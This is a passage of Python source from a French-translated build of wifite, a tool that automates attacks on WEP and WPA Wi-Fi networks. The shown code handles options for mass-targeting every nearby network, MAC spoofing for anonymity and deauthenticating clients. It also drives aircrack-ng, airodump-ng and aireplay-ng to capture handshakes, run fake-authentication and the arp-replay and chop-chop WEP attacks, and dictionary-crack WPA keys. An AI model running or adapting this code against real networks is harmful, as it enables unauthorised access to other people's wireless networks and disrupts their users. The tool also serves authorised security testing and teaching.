	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"Crack de Wep/Wpa massif"
	print G+"':.  ':.  ':. "+GR+"/_\\"+G+" ,:'  ,:'  ,:'  "
	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"Conçu pour backtrack4"
	print G+"  ':.       "+GR+"/_____\\"+G+"      ,:'     "
	print G+"           "+GR+"/       \\"+G+"             "
	print W

############################################################################### check_root
def check_root():
	""" returns True if user is root, false otherwise """
	if os.getenv('LOGNAME','none').lower() == 'root':
		return True
	return False

############################################################################### handle args
def handle_args(args):
	""" handles arguments, sets global variables if specified """
	global IFACE, WEP, WPA, CHANNEL, ESSID, DICT, WPA_MAXWAIT, WEP_MAXWAIT, STRIP_HANDSHAKE
	global W, BLA, R, G, O, B, P, C, GR # colors
	global WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841, TEMPDIR, EXIT_IF_NO_FAKEAUTH # wep attacks
	global REVISION, THEFILE, CHANGE_MAC, ORIGINAL_MAC, ANONYMOUS_MAC
	
	# first loop, finds '-no-color' in case the user doesn't want to see any color!
	for a in args:
		#nocolor
		if a == '-no-color' or a == '--no-color' or a == '-nocolor':
			# no colors, blank out the colors
			W  = ""
			BLA= ""
			R  = ""
			G  = ""
			O  = ""
			B  = ""
			P  = ""
			C  = ""
			GR = ""
			print '[+] Les couleurs ont été neutralisées :)\n'
			break
	
	# second loop, look for 'help' or 'upgrade' because these are single-servin arguments
	# the program will terminate after these commands are issued
	for a in args:
		#HELP
		if a == 'h' or a == 'help' or a == '-h' or a == '?' or a == '/?' or a == 'commands':
			halp()
			subprocess.call(['rm','-rf',TEMPDIR])
			sys.exit(0)
		elif a == '--help' or a == '-help':
			halp(True)
			subprocess.call(['rm','-rf',TEMPDIR])
			sys.exit(0)
			
		elif a == '-update' or a == '--update' or a == '-upgrade' or a == '--upgrade':
			# upgrayedd
			update()
			subprocess.call(['rm','-rf',TEMPDIR])
			sys.exit(0)
		elif a == '-v' or a == '-version' or a == '-V' or a == '--version' or a == 'version':
			print GR+'[+] '+W+'La révision actuelle de wifite est: '+G+'r'+str(REVISION)+W
			print GR+'[+] '+W+'Lancez '+G+'./wifite.py -upgrade'+W+' pour vérifier les mises à jour'
			sys.exit(0)
			
	
	# second loop, for hte other options
	i = 0
	while (i < len(args)):
		a = args[i]
		
		if a == '-i' or a == '--iface':
			try:
				IFACE=args[i+1]
				print GR+'[+] '+W+'Interface wireless utilisée: "'+G + IFACE + W+'"'
			except IndexError:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			
			i+=1
			
		elif a == '-c' or a == '--chan':
			try:
				CHANNEL=args[i+1]
				print GR+'[+] '+W+'Scan uniquement les reseaux sur "'+G + CHANNEL + W+'"'
			except IndexError:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i+=1
			
		elif a == '-e' or a == '--essid' or a == '-essid':
			try:
				ESSID=args[i+1]
				if ESSID.lower() == 'all' or ESSID.lower() == '"all"':
					if ESSID.startswith('pow>'):
						print O+'[!] ESSIDS déja ciblés avec une puissance supérieure à '+ESSID[4:]+'dB'+W
					else:
						ESSID = 'all'
						print GR+'[+] '+W+'Ciblage essid "'+G + ESSID + W+'"'
			except IndexError:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i+=1
			
		elif a == '-all' or a == '--all':
			if ESSID.startswith('pow>'):
				print O+'[!] ESSIDS déja ciblés avec une puissance suppérieure à '+ESSID[4:]+'dB'+W
			else:
				ESSID = 'all'
				print GR+'[+] '+W+'Ciblage essid "'+G + ESSID + W+'"'
			
		elif a == '-p' or a == '--power':
			try:
				tempint=int(args[i+1])
			except IndexError:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			except ValueError:
				print R+'[!] Puissance invalide!'
				print R+'[!] Entrez -e pow>## oÃ¹ ## est un nombre de 1 - 2 chiffres'
				print R+'[!] exemple: ./'+THEFILE+' -e pow>55'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			
			print GR+'[+] '+W+'Ciblage des reseaux avec un signal de puissance suppérieure à '+G+ str(tempint)+'dB'+W
			ESSID='pow>'+str(tempint)
			
		elif a == '-d' or a == '--dict' or a == '-dict':
			try:
				DICT=args[i+1]
				print GR+'[+] '+W+'Utilisation du dictionnaire "'+G + DICT + W+'"'
			except IndexError:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i+=1
			
		elif a == '-nowpa' or a == '--no-wpa':
			print GR+'[+] '+W+'Scan uniquement pour '+G+'Réseaux cryptés WEP'+W
			WPA=False
			
		elif a == '-nowep' or a == '--no-wep':
			print GR+'[+] '+W+'Scan uniquement pour '+G+'Réseaux cryptés WPA'+W
			WEP=False
		
		elif a == '-wpaw' or a == '--wpa-wait':
			try:
				WPA_MAXWAIT=int(args[i+1])*60
				print GR+'[+] '+W+'Temps d\'attente WPA:',
				if WPA_MAXWAIT == 0:
					print G+'Illimité'
				else:
					print G+str(WPA_MAXWAIT/60)+' minutes'
				
			except Exception:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i=i+1
			
		elif a == '-wepw' or a == '--wep-wait':
			try:
				WEP_MAXWAIT=int(args[i+1])*60
				print GR+'[+] '+W+'Temps d\'attente WEP:',
				if WEP_MAXWAIT == 0:
					print G+'Illimité'
				else:
					print G+str(WEP_MAXWAIT/60)+' minutes'
			except Exception:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i=i+1
		
		elif a == '-pps' or a == '--pps':
			try:
				WEP_PPS=int(args[i+1])
				print GR+'[+] '+W+'Nombres de paquets WEP replay: '+G+str(WEP_PPS)+'/sec'
			except Exception:
				print R+'[!] Erreur! Argument invalide'
				print R+'[!] Le programme va se fermer'
				print W
				subprocess.call(['rm','-rf',TEMPDIR])
				sys.exit(0)
			i=i+1
		
		elif a == '-keepmac' or a == '--keep-mac':
			CHANGE_MAC=False
			print GR+'[+] '+W+'Changement de votre MAC '+O+'Désactivé'+W
			
		elif a == '-mac' or a == '--change-mac':
			# keep this here, for the old-school users that still use '-mac' option
			print GR+'[+] '+W+'Changement de votre MAC '+G+'Activé'+W
		
		elif a == '-noarp' or a == '--no-arp':
			WEP_ARP=False
			print GR+'[+] '+W+'Attaque arp-replay '+G+'Désactivée'+W
		
		elif a == '-nochop' or a == '--no-chop':
			WEP_CHOP=False
			print GR+'[+] '+W+'Attaque chop-chop '+G+'Désactivée'+W
		
		elif a == '-nofrag' or a == '--no-frag':
			WEP_FRAG=False
			print GR+'[+] '+W+'Attaque par fragmentation '+G+'Désactivée'+W
		
		elif a == '-no0841' or a == '--no-p0841':
			WEP_P0841=False
			print GR+'[+] '+W+'Attaque -p 0841 '+G+'Désactivée'+W
		
		elif a == '-console' or a == '--console':
			print GR+'[+] '+G+'mode console'+W+' Activée'
		
		elif a == '-f' or a == '--force-fake':
			print GR+'[+] '+W+'Continuez l\'attaque WEP si la fake-auth échoue '+O+'Activée'+W+''
			EXIT_IF_NO_FAKEAUTH=False
		
		elif a == '-nod' or a == '--no-deauth':
			print GR+'[+] '+W+'Désauthentification des réseaux cachés '+O+'Désactivé'+W+''
			NO_HIDDEN_DEAUTH=True
			
		elif a == '-nostrip' or a == '--no-strip':
			print GR+'[+] '+W+'Découpage du handshake WPA '+O+'Désactivé'+W+''
			STRIP_HANDSHAKE=False
		
		elif a == '-anon' or a == '--anonymous' or a == '--anon':
			ANONYMOUS_MAC=random_mac()
			print GR+'[+] '+W+'Adresse MAC anonyme '+G+'Activée'+W+''
		
		i += 1
		
	if WEP==False and WPA==False:
		print R+'[!] Erreur, WEP ET WPA sont desactives!'
		print R+'[!] Ce sont les seuls catégories de réseaux que l\'ont peux cracker'
		print R+'[!] Le programme va se fermer'
		print W
		subprocess.call(['rm','-rf',TEMPDIR])
		sys.exit(0)

############################################################################### logit
def logit(txt):
	""" saves txt to both file log and list log
		prepends date and time to the file log entry"""
	THE_LOG.append(txt)
	f = open('log.txt', 'a')
	f.write(datetime()+' ' + txt +'\n')
	f.close()

############################################################################### halp
def halp(full=False):
	""" displays the help screen 
		if full=True, prints the full help (detailed info)
	"""
	global THEFILE
	
	print GR+'Usage: '+W+'python '+THEFILE+' '+G+'[Options] [Filtres]\n'
	
	if not full:
		print G+'  -help    '+GR+'Affiche l aide compléte\n'
		print G+'  -console '+GR+'Mode Console (non-GUI)\n'
		print G+'  -upgrade '+GR+'Telecharger et Installer la derniere version\n'
	else:
		print G+'  -upgrade\t '+GR+'Telecharger et Installer la derniere version\n'
	
	print GR+'  SETTINGS'
	#IFACE
	if full:
		print G+'  -i, --iface\t'+GR+'     ex. -i wlan0'
		print '             \t Interface wireless'
		print '             \t Le programme selectionne automatiquement l interface en mode moniteur'
		print '             \t Entrez manuellement le nom de votre interface si elle n est pas trouvée automatiquement'
		print '             \t Si il ne la trouve pas automatiquement, il va la demander\n'
	else:
		print G+'  -i\t   '+GR+'Interface wireless'
	#ANON
	if full:
		print G+'  --anon  \t '+GR+'    anonymise l\'attaque'
		print '            \t Avant de commencer une attaque, votre adresse MAC est changée par une'
		print '            \t adresse MAC aléatoire. Après que l\'attaque sois finie, l\'adresse MAC est restaurée.\n'
	else:
		print G+'  -anon\t   '+GR+'anonymise l\'attaque. changer l\'adresse MAC'
	#DICT
	if full:
		print G+'  -d, --dict\t'+GR+'     ex. -d /pentest/passwords/wordlists/darkc0de.lst'
		print '             \t Fichier dictionnaire pour le crack du WPA'
		print '             \t Le programme va le demander si tu ne l\'a pas précisé'
		print '             \t Utilisez -d pour rentrer directement le chemin du fichier'
		print '             \t Par défaut, il va aussi chercher "wordlis.txt" dans le meme dossier que wifite.py'
		print '             \t Si vous ne voulez pas cracker le handshake: -d "none"'
		print '             \t Wifite ne va pas essayer de cracker le handshake'
		print '             \t Il va le juste le capturer/\n'
	else:
		print G+'  -d\t   '+GR+'Fichier dictionnaire, pour le crack WPA'
	#WPAWAIT
	if full:
		print G+'  --wpa-wait\t'+GR+'     ex. -wpaw 15'
		print '          \t Défini le temps maximum d\'attente pour le handshake WPA (en minutes)'
		print '          \t Entrez "0" pour illimité\n'
	else:
		print G+'  -wpaw\t   '+GR+'Temps maximum d\'attente pour le handshake WPA (en minutes)'
	# handshake strip
	if full:
		print G+'  --no-strip\t'+GR+' Enleve les packets non-handshake du fichier .cap'
		print '         \t Utilise pyrit (ou tshark) pour enlever les packets inutile'
		print '         \t Reduit la taille du fichier .cap\n'
	else:
		print G+'  -nostrip '+GR+'Sort le handshake WPA des fichiers de capture (reduit la taille du fichier .cap)'
	#WEPWAIT
	if full:
		print G+'  --wep-wait\t'+GR+'     ex. -wepw 10'
		print '          \t Défini le temps maximum d\'attente pour chaque attaque WEP.'
		print '          \t Dépend des paramétres, ça peux prendre du temps'
		print '          \t si le temps est 10min, chaque methode de crack prendra 10 min'
		print '          \t si vous avez 4 attaques WEP sélectionnée, ça peux prendre 40 min'
		print '          \t Entrez "0" pour illimité\n'
	else:
		print G+'  -wepw\t   '+GR+'Temps maximum (en minutes) pour capturer/cracker la clé WEP de chaque réseau'
	#PPS
	if full:
		print G+'  --pps\t\t'+GR+'     ex. -pps 400'
		print '          \t Paquets Par Secondes; uniquement pour les attaques WEP.'
		print '          \t Plus de PPS = plus de IVs capturés, Ce qui veux dire un crack plus rapide'
		print '          \t Choisisez un petit PPS pour un réseau faible ou éloigné\n'
	else:
		print G+'  -pps\t   '+GR+'Paquets Par Secondes (uniquement attaques WEP)'
	#(don't) CHANGE_MAC
	if full:
		print G+'  --keep-mac\t'+GR+' Ne pas changer l\'addresse MAC de votre interface wireless\n'
	else:
		print G+'  -keepmac '+GR+'NE PAS changer l\'adresse MAC de votre interface wireless'
	#wep: no-attack
	if full:
		print G+'  --no-arp\t'+GR+' Désactive les attaques WEP arp-replay'
		print G+'  --no-chop\t'+GR+' Désactive les attaques WEP chop-chop'
		print G+'  --no-frag\t'+GR+' Désactive les attaques WEP par fragmentation'
		print G+'  --no-p0841\t'+GR+' Désactive les attaques WEP -p0841\n'
	else:
		print G+'  -noarp   '+GR+'Désactive les attaques arp-replay'
		print G+'  -nochop  '+GR+'Désactive les attaques chop-chop'
		print G+'  -nofrag  '+GR+'Désactive les attaques fragmentation'
		print G+'  -no0841  '+GR+'Désactive les attaques -p0841'
	#WEP FORCE FAKE-AUTH (cancels attack if failed)
	if full:
		print G+'  --force-fake\t '+GR+'Pendant une attaque WEP, si la fake-auth échoue, forcer à continuer'
		print   '              \t avec les attaques fake-authentication'
		print   '              \t Par default il stop l\'attaque quand la fake-auth échoue\n'
	else:
		print G+'  -f       '+GR+'Force les attaques WEP a continuer si la fake-auth échoue'
	# SSID DEAUTH
	if full:
		#-nod --no-deauth
		print G+'  --no-deauth\t '+GR+'Désactive la déconnexion des clients sur les réseaux cachés'
		print   '             \t par défault, wifite va déconnecter les clients connectés sur un réseau caché'
		print   '             \t *wifite déconnecte les clients sur un SSID caché en MODE CHANNEL FIXE*\n'
	else:
		print G+'  -nod     '+GR+'Ne pas déconnecter les SSID caché pendant le scan d\'un channel fixe'
	#NO COLORS
	if full:
		print G+'  --no-color\t '+GR+'Ne pas afficher les couleurs agaçantes (utilise les couleurs systeme)\n'
	else:
		print G+'  -nocolor '+GR+'Ne pas utiliser du texte coloré (utilise les couleurs systeme)'
	
	
	print GR+'\n  FILTERS'
	#ESSID
	if full:
		print G+'  -e, --essid\t'+GR+'     ex. -e "Linksys"'
		print '             \t essid (nom) du point d\'accès (routeur)'
		print '             \t Ca force une attaque limitée; pas d\'autres réseaux ne serront attaqués\n'
		#print '             \t     e.g. -e "all"'
		#print '             \t using the essid "all" results in every network'
		#print '             \t being targeted and attacked. this is not recommended'
		#print '             \t because most attacks are useless from far away!\n'
	else:
		print G+'  -e\t   '+GR+'ssid (nom) du point d\'acces que vous voulez attaquer'
	#ALL
	if full:
		print G+'  -all, --all\t'+GR+' Cible et attaque tout les réseaux trouvés'
		print '           \t ce qui est dangereux, car la plupart des attaques nécessitent l\'injection,'
		print '           \t la plupart des cartes wifi ne peuvent pas injecter, sauf s\'ils sont à proximité de l\'AP \n'
	else:
		print G+'  -all\t   '+GR+'Cible et attaque les points d\'accés trouvés'
	#POWER
	if full:
		print G+'  -p, --power\t'+GR+'     ex. -p 55'
		print '             \t Puissance minimale (dB)'
		print '             \t Similaire à l\'option "-e all", sauf qu\'il filtre et ignore les APs'
		print '             \t qui sont trop éloignés. \n'
	else:
		print G+'  -p\t   '+GR+'Filtre une puissance minimale (dB) pour attaquer; il ignore les reseaux faibles ou éloignés'
	#CHANNEL
	if full:
		print G+'  -c, --channel\t'+GR+'     ex. -c 6'
		print '               \t Channel à scanner *uniquement*'
		print '               \t Scanne un seul channel'
		print '               \t A utiliser uniquement si vous connaissez LE channel a écouter\n'
	else:
		print G+'  -c\t   '+GR+'Channel a scanner (Par defaut, tout les channels)'
	#NOWPA
	if full:
		print G+'  --no-wpa\t'+GR+' Ignore tout les réseaux WPA'
		print '          \t utile pour filtrer quand vous avez --power ou "-e all" \n'
	else:
		print G+'  -nowpa   '+GR+'NE PAS scanner les réseaux WPA (ON par défaut)'
	#NOWEP
	if full:
		print G+'  --no-wep\t'+GR+' Ignore tout les réseaux WEP'
		print '          \t utile pour filtrer quand vous avez -p ou "-e all"\n'
	else:
		print G+'  -nowep   '+GR+'NE PAS scanner les réseaux WEP (ON par défaut)'
	
############################################################################### find_mon	
def find_mon():
	"""
	finds any wireless devices running in monitor mode
	if no monitor-mode devices are found, it asks for a device to put into monitor mode
	if only one monitor-mode device is found, it is used
	if multiple monitor-mode devices are found, it asks to pick one
	"""
	global IFACE, TEMPDIR
	
	ifaces=[]
	print GR+'[+] '+W+'Recherche des interfaces en mode moniteur...'
	proc=subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	txt=proc.communicate()[0]
	lines=txt.split('\n')
	current_iface=''
	for line in lines:
		if not line.startswith(' ') and line[0:line.find(' ')] != '':
			current_iface=line[0:line.find(' ')]
		if line.find('Mode:Monitor') != -1:
			ifaces.append(current_iface)
	
	if len(ifaces) == 0 or ifaces == []:
		print GR+'[!] '+O+'Aucune interface en mode moniteur!'
		proc=subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
		txt=proc.communicate()[0]
		lines=txt.split('\n')
		poss=[]
		
		for line in lines:
			if line != '' and line.find('Interface') == -1:
				poss.append(line)
				i=len(poss)-1
				if poss[i][:poss[i].find('\t')].lower() == IFACE.lower():
					poss=[poss[i][:poss[i].find('\t')]]
					break
		
		if len(poss) == 0:
			print R+'[!] Aucune interface \'est capable de se mettre en mode moniteur!'
			print R+'[!] Vous avez peut-être besoin d\'installer de nouveaux drivers'
			print R+'[+] Le programme va s\'arreter.'
			print W
			subprocess.call(['rm','-rf',TEMPDIR])
			sys.exit(0)
		elif len(poss) == 1 and IFACE != '' and poss[0].lower() == IFACE.lower():
			print GR+'[+] '+W+'L\'interface "'+G + poss[0] + W+'" se met en mode moniteur...'
			subprocess.call(['airmon-ng','start',poss[0]], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			IFACE=''
			find_mon()  # recursive call
			return
		else:
			print GR+'\n[+] '+W+'Sélectionnez le périphérique que vous voulez mettre en mode moniteur:'
			for p in xrange(0, len(poss)):
				print '      '+G + str(p + 1) + W+'. ' + poss[p]
			
			err=True
			while err==True:
				try:
					print GR+'[+] '+W+'Sélectionnez l\'interface wifi(entre '+G+'1'+W+' et '+G + str(len(poss)) + W+'):'+G,
					num=int(raw_input())
					if num >= 1 and num <= len(poss):
						err=False
				except ValueError:
					err=True
			poss[num-1] = poss[num-1][:poss[num-1].find('\t')]
			print GR+'[+] '+W+'L\'interface "'+G + poss[num-1] + W+'" se met en mode moniteur...'
			subprocess.call(['airmon-ng','start',poss[num-1]], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
			find_mon()  # recursive call
			return
		
	else: # lif len(ifaces) == 1:
		# make sure the iface they want to use is already in monitor mode
		if IFACE != '':
			for i in ifaces:
				if i == IFACE:
					print GR+'[+] '+W+'Utilisation de l\'interface "'+G+ IFACE +W+'"\n'
					return
		
		IFACE=ifaces[0] # only one interface in monitor mode, we know which one it is
		print GR+'[+] '+W+'On passe sur l\'interface "'+G+ IFACE +W+'"\n'
		return
	print GR+'[+] '+W+'Utilisation de l\'interface "'+G+ IFACE +W+'"\n'

############################################################################### getmac()
def getmac():
	""" returns the MAC address of the current interface """
	global IFACE
	
	proc_mac = subprocess.Popen(['ifconfig',IFACE], stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	proc_mac.wait()
	lines = proc_mac.communicate()[0]
	if lines == None:
		return 'NO MAC'
	
	for line in lines:
		line = lines.split('\n')[0]
		line=line[line.find('HWaddr ')+7:]
		if line.find('-') != -1:
			macnum=line.split('-')
			mac=''
			for i in xrange(0, len(macnum)):
				mac=mac+macnum[i]
				if i < 5:
					mac=mac+':'
				else:
					break
			return mac
		else:
			return line.strip()

############################################################################### wpa_crack
def wpa_crack(index):
	"""
		index = the index of WPA_CRACK list we are cracking
		as we grab handshakes during the inital attacks, the handshakes are stored in WPA_CRACK
		this opens aircrack (in the background) and tries to crack the WPA handshakes
		i don't have a way to get the # of tries per second or total, so it just outputs "cracking" every 5 seconds
		maybe it could do something else...
	"""
	global DICT, WPA_CRACK, TEMPDIR, CRACKED
	
	filename=WPA_CRACK[index][0]
	ssid    =WPA_CRACK[index][1]
	
	print GR+'['+sec2hms(0)+'] '+W+'Commencement du Crack WPA pour "'+G + ssid + W+'";',
	
	# calculate number of passwords we will try
	proc_pmk=subprocess.Popen(['wc','-l',DICT], stdout=subprocess.PIPE, stderr=open(os.devnull,'w'))
	txt=proc_pmk.communicate()[0]
	if txt != None:
		txt=txt.strip().split(' ')[0]
		if txt != '':
			total_pmks=int(txt.strip())+1
			print 'Utilisation de '+G+DICT+W+' ('+G + str(total_pmks) +' mots de passe'+W+')'
	else:
		total_pmks=0
		print ''
	
	cracked=''
	proc_crack=''
	START_TIME=time.time()
	
	try:
		subprocess.call(['rm','-rf',TEMPDIR+'wpakey.txt',TEMPDIR+'crackout.tmp'])
		time.sleep(0.1)
		
		cmd = 'aircrack-ng -a 2 -w '+DICT+' -l '+TEMPDIR+'wpakey.txt '+filename+' >> '+TEMPDIR+'crackout.tmp'
		proc_crack = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), shell=True)
		
		ks='0'
		pmks='0'
		while (proc_crack.poll() == None):
			time.sleep(1)
			print '\r'+GR+'['+sec2hms(time.time() - START_TIME)+'] '+W+'cracking;',
			f=open(TEMPDIR+'crackout.tmp')
			txt=f.read()
			if txt != '' and txt != None:
				ks=''
				
				# find the keys per second
				last=txt.rfind(' k/s)')
				first=txt.rfind('(')
				if last != -1 and first != -1:
					first+=1
					ks=txt[first:last]
					if ks.strip() != '':
						print G+str(ks)+W+' c/s;',
						
						# find the total keys
						last=txt.rfind(' keys tested')
						first=txt.rfind('] ')
						if last != -1 and first != -1:
							first+=2
							pmks=txt[first:last]
							if pmks.strip() != '':
								print G+str(pmks)+W+' Clés totales;',
								if total_pmks != 0 and pmks != '':
									print G+str(int(pmks) * 100 / total_pmks) + '%'+W,
						
									# find the ETA
									if ks.find('.') != -1 and pmks != '':
										kps=int(ks[:ks.find('.')])
										if kps > 0:
											eta=int((total_pmks - int(pmks)) / kps)
											print 'eta: ' + C+sec2hms(eta),
									print '     '+W,
			sys.stdout.flush()
			
			# wipe the aircrack output file (keep it from getting too big)
			subprocess.call('echo "" > '+TEMPDIR+'crackout.tmp',shell=True)
		
		print '\r'+GR+'['+sec2hms(time.time() - START_TIME)+'] '+W+'cracking;',
		print G+str(ks)+W+' C/s;',
		print G+str(total_pmks)+W+' clés totales;',
		print G+'100%'+W,
		print 'eta: '+C+'0:00:00     '+W
		
		if os.path.exists(TEMPDIR+'wpakey.txt'):
			f = open(TEMPDIR+'wpakey.txt','r')
			cracked=f.readlines()[0]
			print '\n'+GR+'['+sec2hms(time.time()-START_TIME)+'] '+G+'"' + ssid + '" Cracké! La clé est: "'+C+cracked+G+'"'
			logit('cracked WPA key for "' + ssid + '", the key is: "' + cracked + '"')
			CRACKED += 1
			
		else:
			print GR+'\n['+sec2hms(time.time()-START_TIME)+'] '+W+'Le crack avec dictionnaire est terminé; '+O+'La clé WPA pour "' + ssid + '" n\'a pas été trouvée dans le dictionnaire'
		
	except KeyboardInterrupt:
		print R+'\n['+sec2hms(time.time()-START_TIME)+'] '+O+'Crack interompu\n'+W
		# check if there's other files to crack (i < len(WPA_CRACK))
		# if there are, ask if they want to start cracking the next handshake, or exit
		if index != len(WPA_CRACK) - 1:
			# there are more handshakes to crack! prompt a menu...
			menu= G+'   [c]ontinuer à cracker les autres handshakes ('+str(len(WPA_CRACK)-index-1)+' remaining)\n'
			menu+=R+'   [e]xit'
			
			print GR+'\n[+] '+W+'Sélectionnez une option dans le menu:'
			print menu
			print GR+'[+] '+W+'Entrez('+G+'c'+W+' ou '+R+'e'+W+'):',
			typed=raw_input()
			if typed == 'e':
				WPA_CRACK.append(['',''])
	
	try:
		os.kill(proc_crack.pid, signal.SIGTERM)
	except OSError:
		pass
	except UnboundLocalError:
		pass
	# for some reason (maybe the stream pointer?) aircrack doesn't stay dead.
	subprocess.call(['killall','aircrack-ng'], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
	
	# remove the temp file
	subprocess.call(['rm','-rf',TEMPDIR+'crackout.tmp'])

############################################################################### dict_check
def dict_check():
	""" checks if user has specified a dictionary
		if not, it checks the current ATTACK list for any targets that may be WPA
		if it finds any WPA, it immediately prompts the user for a dictionary
		user has the option to ctrl+C or type 'none' to avoid cracking
		if DICT is 'none', then reset DICT to '' and move on
	"""
	global DICT, ATTACK, TARGETS
	if DICT == '':
		for x in ATTACK:
			if TARGETS[x-1][2].startswith('WPA'):
				# we don't have a dictionary and the user wants to crack WPA
				print GR+'\n[+] '+W+'Afin de cracker des clés WPA, vous avez besoin d\''+O+'entrer un fichier dictionnaire'
				ent = 'blahnotafile'
				#try:
				while 1:
					print GR+'[+] '+W+'Entrez le chemin du dictionnaire a utiliser, ou tapez "'+G+'none'+W+'" ne pas cracker les WPA:'
					ent = raw_input()
					if ent == 'none' or ent == '"none"':
						break
					elif not os.path.exists(ent):
						print R+'[!] Erreur! Chemin non trouvé: '+O+ent+R+'; Essayez encore SVP\n'
					else:
						DICT=ent
						print GR+'[+] '+W+'Utilisation de "'+G+DICT+W+'" comme dictionnaire WPA'
						break
					
				#except KeyboardInterrupt:
				#	print GR+'\n[+] '+W+'no dictionary file entered; continuing anyway'
					
				break
	elif DICT == 'none':
		DICT=''
	
############################################################################### attack
def attack(index):
	""" checks if target is WPA or WEP, forwards to the proper method """
	print GR+'\n[+] '+W+'Attaque de "'+G + TARGETS[index][8] + W+'"...'
	if TARGETS[index][2].startswith('WPA'):
		attack_wpa(index)
	elif TARGETS[index][2].startswith('WEP'):
		attack_wep_all(index)
	else:
		print R+'\n[!] Cryptage inconnu: '+O + TARGETS[index][2] + R+'\n'

############################################################################### is_shared
def is_shared(index):
	""" uses aireplay fake-auth to determine if an AP uses SKA or not
		returns True if AP uses SKA, False otherwise """
	global TARGETS, IFACE
	cmd=['aireplay-ng','-1','0',TARGETS[index][0],'-T','1',IFACE]
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
	txt=proc.communicate()[0]
	if txt == None:
		return False
	elif txt.lower().find('shared key auth') != -1:
		return True
	else:
		return False
	
############################################################################### attack_wep_all
def attack_wep_all(index):
	""" attacks target using all wep attack methods """
	global TARGETS, CLIENTS, IFACE, WEP_MAXWAIT, WEP_PPS
	global THIS_MAC, WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841
	global AUTOCRACK, CRACKED, OLD_MAC, TEMPDIR, EXIT_IF_NO_FAKEAUTH
	global SKIP_TO_WPA, WPA_CRACK, EXIT_PROGRAM # to exit early
	global HAS_INTEL4965, THEFILE, CHANGE_MAC
	
	# to keep track of how long we are taking
	TIME_START=time.time()
	
	# set up lists so we can run all attacks in this method
	weps   =[WEP_ARP,      WEP_CHOP,    WEP_FRAG,    WEP_P0841]
	wepname=['arp replay','chop-chop','fragmentation','-p0841']
	
	# if there's no selected attacks, stop
	if weps[0]==False and weps[1]==False and weps[2]==False and weps[3]==False:
		print R+'[!] Aucune attaque WEP n\'a été sélectionnée; impossible d\'attaquer!'
		print R+'[!] Changez '+THEFILE+' et mettez au moin une attaque WEP'
		print W
		return
	
	# flags
	stop_attack=False
	started_crack=False
	EXIT_PROGRAM=False
	
	OLD_MAC=''
	# set the client to a client, or this mac address if there's no clients
	client=CLIENTS.get(TARGETS[index][0], THIS_MAC)
	
	# kill all backup IVS files... just in case
	subprocess.call('rm -rf '+TEMPDIR+'wep-*.ivs', shell=True)
	#subprocess.call('rm -rf wep-*.cap', shell=True)
	
	# delete airodump log files
	subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
	subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
	time.sleep(0.1)
	
	# open airodump to capture packets
	cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
			'--output-format','csv,ivs',IFACE]
	proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
	
	try:
		# if we don't have a client, OR it's using SKA (have to fake-auth anyway)
		if client == THIS_MAC or is_shared(index) or CHANGE_MAC == False:
			# fake-authenticate with the router
			faked=False
			if not HAS_INTEL4965:
				for i in xrange(1, 4):
					time.sleep(1)
					
					print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+\
								'] '+W+'Tentative de '+O+'fake-authentication'+W+' ('+str(i)+'/3)',
					sys.stdout.flush()
					time.sleep(0.3)
					faked=attack_fakeauth(index)
					if faked:
						break
			else:
				print GR+'[+] '+R+'Arret de '+W+'airodump-ng'
				# wpa_supplicant workaround requires airodump-ng be closed.
				try:
					os.kill(proc_read.pid, signal.SIGTERM)   # airodump-ng
				except OSError:
					pass
				except UnboundLocalError:
					pass
				subprocess.call(['killall','airodump-ng'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
				time.sleep(0.5)
				
				print GR+'[+] '+W+'Arret de '+O+'mon0'
				subprocess.call(['airmon-ng','stop','mon0'], stdout=open(os.devnull,'w'), stderr=open(os.devnull,'w'))
				
				print ''+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+O+'Tentative de contournement intel 4965'+W
				faked=attack_fakeauth_intel(index)
				
				print GR+'[+] '+W+'Démarrage de '+O+'wlan1'+W+' sur le channel '+O+str(TARGETS[index][1])+W
